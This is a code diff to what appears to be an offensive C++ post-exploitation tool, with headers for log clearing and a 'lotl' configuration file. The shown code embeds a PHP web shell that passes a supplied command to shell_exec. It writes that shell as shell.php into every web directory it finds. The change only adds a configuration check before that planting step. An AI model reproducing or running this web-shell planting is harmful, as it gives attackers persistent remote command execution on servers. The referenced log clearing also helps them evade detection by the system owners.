@@ -7,6 +7,7 @@
 #include "tools/web.h"
 #include "tools/clearlogs.h"
 #include "modules/scandir.h"
+#include "modules/parsers.h"
 
 
 #define RESET   "\033[0m"
@@ -79,17 +80,20 @@ int main() {
         echo "<pre>" . shell_exec($cmd) . "</pre>";
     }
     ?>)";
-    auto files = wwwDir();
-    for (const auto& dir : files) {
-        std::cout << "Found directory: " << dir << "\n";
-        std::string shellPath = dir + "/shell.php";
-        std::ofstream outFile(shellPath);
-        outFile << phpShell;
-        outFile.close();
-        if (std::filesystem::exists(shellPath)) {
-            std::cout << GREEN << "shell.php created!" << RESET << "\n";
-        } else {
-            std::cout << RED << "shell.php wasn't created" << RESET << "\n";
+    std::vector<std::string> webs = parseDependencies("config/lotl.conf", "www");
+    if (find(webs.begin(), webs.end(), std::string("yes")) != webs.end()) {
+        auto files = wwwDir();
+        for (const auto& dir : files) {
+            std::cout << "Found directory: " << dir << "\n";
+            std::string shellPath = dir + "/shell.php";
+            std::ofstream outFile(shellPath);
+            outFile << phpShell;
+            outFile.close();
+            if (std::filesystem::exists(shellPath)) {
+                std::cout << GREEN << "shell.php created!" << RESET << "\n";
+            } else {
+                std::cout << RED << "shell.php wasn't created" << RESET << "\n";
+            }
         }
     }
     return 0;
